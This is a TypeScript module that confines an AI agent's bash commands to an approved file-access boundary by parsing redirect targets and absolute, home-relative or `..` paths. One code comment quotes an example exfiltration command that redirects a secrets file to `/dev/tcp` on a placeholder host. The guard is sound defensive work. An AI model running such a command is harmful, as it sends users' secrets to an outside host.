import { isAbsolute, join } from "node:path";
import { homedir } from "node:os";
import type { SecurityDecision } from "../types.js";
import { USER_HINTS } from "../types.js";
import type { FileAccessMode } from "./types.js";
import { evaluateFileAccess } from "./file-access.js";
import { evaluateShellCommand } from "./shell-policy.js";

// ── Best-effort shell file-access confinement (defense in depth) ──
//
// The dedicated file tools (read/write/edit, spreadsheet, document, …) are
// confined to the file-access mode by routing every caller path through
// evaluateFileAccess. bash is the hole: it can `cat`/`type`/redirect to any
// file the OS user can reach, regardless of the mode. The SOUND fix is OS-level
// process confinement (Linux Landlock/bubblewrap, macOS sandbox-exec) so the
// kernel — not a parser — limits what bash sees; that is the planned POSIX
// hard-wall. Windows has no cheap native jail, so this guard is the layer that
// makes bash OBEY THE MODE there today.
//
// It is explicitly BEST-EFFORT, not a hard wall: it reads the command string,
// extracts path-shaped tokens, and asks the SAME evaluateFileAccess gate the
// file tools use whether each is inside the approved roots. It rejects the
// realistic escapes (an absolute or ~-expanded path, a `..` climb, a redirect
// target outside the boundary). It CANNOT see a path that only exists at
// runtime (`$VAR`, `$(...)`) — but shell-policy already blocks command
// substitution, chaining, and `${}`, so those avenues are mostly closed
// upstream. The dedicated tools remain the real wall for file work.
//
// Single source of truth: the per-path decision is evaluateFileAccess — the
// exact gate the file tools use — so the mode means the same thing everywhere.

export interface ShellPathGuardCtx {
  workspace: string;
  fileAccessMode: FileAccessMode;
  allowedPathCheck: (realPath: string, sessionId?: string) => boolean;
  sessionId?: string;
}

// Device sinks that are always fine as a target, both platforms. A redirect to
// /dev/null must not read as "escaping the workspace".
const BENIGN_PATHS = new Set([
  "/dev/null", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/tty",
  "nul", "con", "/dev/fd/1", "/dev/fd/2",
]);

interface PathToken {
  path: string;
  action: "read" | "write"; // redirect targets gate as writes; everything else as reads
}

/**
 * Confine a bash command to the file-access mode, best-effort. Returns the
 * first out-of-boundary path as a block, else allows. Unrestricted mode is a
 * no-op (evaluateFileAccess already allows reads anywhere).
 */
export function evaluateShellPaths(command: string, ctx: ShellPathGuardCtx): SecurityDecision {
  if (ctx.fileAccessMode === "unrestricted") {
    return { allowed: true, reason: "Unrestricted mode — shell paths not confined" };
  }
  for (const tok of extractPathTokens(command)) {
    const decision = evaluateFileAccess(
      ctx.workspace,
      ctx.fileAccessMode,
      ctx.allowedPathCheck,
      tok.action,
      tok.path,
      ctx.sessionId,
    );
    if (!decision.allowed) {
      return {
        allowed: false,
        reason: `Blocked: shell command touches "${tok.path}" outside the ${ctx.fileAccessMode} file-access boundary. ${decision.reason}`,
        userHint: USER_HINTS.fileSystem,
      };
    }
  }
  return { allowed: true, reason: "Shell paths within file-access boundary" };
}

/**
 * Single two-step gate for ANY bash-spawning path: (1) command-shape vetting
 * (denylist / obfuscation / metachars) via evaluateShellCommand, then (2)
 * file-access confinement via evaluateShellPaths. bash (layer-core) AND the
 * shell-class dispatch (kernel-class-policy → process_start/process_restart)
 * BOTH call this, so they get IDENTICAL confinement — `process_start` no longer
 * skips the file-access boundary bash obeys (round-3 finding C3-3). Returns the
 * first failing decision; allows only if both steps pass.
 */
export function evaluateShellCommandAndPaths(command: string, ctx: ShellPathGuardCtx): SecurityDecision {
  const cmdDecision = evaluateShellCommand(command);
  if (!cmdDecision.allowed) return cmdDecision;
  return evaluateShellPaths(command, ctx);
}

// Pull the file-path-shaped arguments out of a command. Conservative by intent:
// the first token of each pipe segment (the executable) is skipped — system
// binaries legitimately live outside the workspace — as are pure flags and
// non-path tokens. Plain relative paths are kept implicitly: they resolve under
// the project root, which evaluateFileAccess allows, so we don't even need to
// emit them. Only tokens that could land OUTSIDE the boundary are emitted.
function extractPathTokens(command: string): PathToken[] {
  const out: PathToken[] = [];
  for (const segment of command.split("|")) {
    const words = segment.trim().split(/\s+/);
    // i starts at 1: skip the executable name (a system binary path is fine).
    for (let i = 1; i < words.length; i++) {
      let raw = words[i];
      if (!raw) continue;

      // Redirect operator glued to (or standing before) a path: >f >>f 2>f <f.
      // Capture whether this token is a WRITE target.
      let action: "read" | "write" = "read";
      // A redirect operator can also sit in the MIDDLE of a single token when
      // the source and sink are glued with no whitespace, e.g.
      // `secrets.env>/dev/tcp/h/443` — one word whose `>` is not at token start.
      // split(/\s+/) keeps that as ONE token, so the leading-anchored match
      // below would miss it and the network sink would escape the path guard
      // (R4-15). Detect an interior `>`/`>>`/`<` (optionally with a leading fd
      // number) and split: emit the LEFT as a read (the source file) and fall
      // through to evaluate the RIGHT as the write/read target. A leading
      // operator is handled by the existing match further down — this only
      // fires when there is a non-empty left side.
      const glued = raw.match(/^(.+?)(\d*)(>>|>|<)(.*)$/);
      if (glued && glued[1]) {
        const leftRaw = stripQuotes(glued[1]);
        if (leftRaw && !BENIGN_PATHS.has(leftRaw.toLowerCase()) && looksLikePath(leftRaw)) {
          out.push({ path: leftRaw, action: "read" });
        }
        action = glued[3] === "<" ? "read" : "write";
        raw = glued[4];
        // Bare interior operator with the sink as the NEXT word (`name> sink`).
        if (!raw && i + 1 < words.length) raw = words[++i];
        if (!raw) continue;
      } else {
        const redir = raw.match(/^(\d*)(>>|>|<)(.*)$/);
        if (redir) {
          action = redir[2] === "<" ? "read" : "write";
          raw = redir[3];
          // Bare ">" with the path as the NEXT word: tag that word as a write.
          if (!raw && i + 1 < words.length) {
            raw = words[++i];
            action = redir[2] === "<" ? "read" : "write";
          }
        }
      }

      // `--flag=/path` / `-o=/path` → keep the value side.
      if (raw.startsWith("-")) {
        const eq = raw.indexOf("=");
        if (eq === -1) continue; // a plain flag, not a path
        raw = raw.slice(eq + 1);
      }

      // Strip surrounding quotes (naive — a quoted path with spaces splits into
      // words, but the absolute prefix fragment is enough to detect the escape).
      raw = stripQuotes(raw);
      if (!raw) continue;
      if (BENIGN_PATHS.has(raw.toLowerCase())) continue;

      // Expand a leading ~ exactly as bash will, so the gate sees the real
      // target (~/secret → <home>/secret), not a literal "~/secret" the gate
      // would wrongly treat as a project-relative path.
      if (raw === "~") raw = homedir();
      else if (raw.startsWith("~/") || raw.startsWith("~\\")) raw = join(homedir(), raw.slice(2));

      if (looksLikePath(raw)) out.push({ path: raw, action });
    }
  }
  return out;
}

// Strip a single layer of surrounding quotes from a token. Naive by intent —
// matches the existing best-effort tokenizer.
function stripQuotes(t: string): string {
  return t.replace(/^['"]+|['"]+$/g, "");
}

// Is this token shaped like a path that could escape the workspace? Absolute
// paths (POSIX /…, Windows C:\…, UNC \\…), and any token with a `..` segment.
// Plain relative tokens (`foo.txt`, `src/bar`) are intentionally NOT flagged:
// they resolve inside the project, which the mode already permits.
function looksLikePath(t: string): boolean {
  if (isAbsolute(t)) return true;              // /etc/passwd, \\server\share, C:\… on win32
  if (/^[A-Za-z]:[\\/]/.test(t)) return true;  // C:\ or C:/ — cross-platform recognition
  if (/(^|[\\/])\.\.([\\/]|$)/.test(t)) return true; // a `..` path segment
  return false;
}
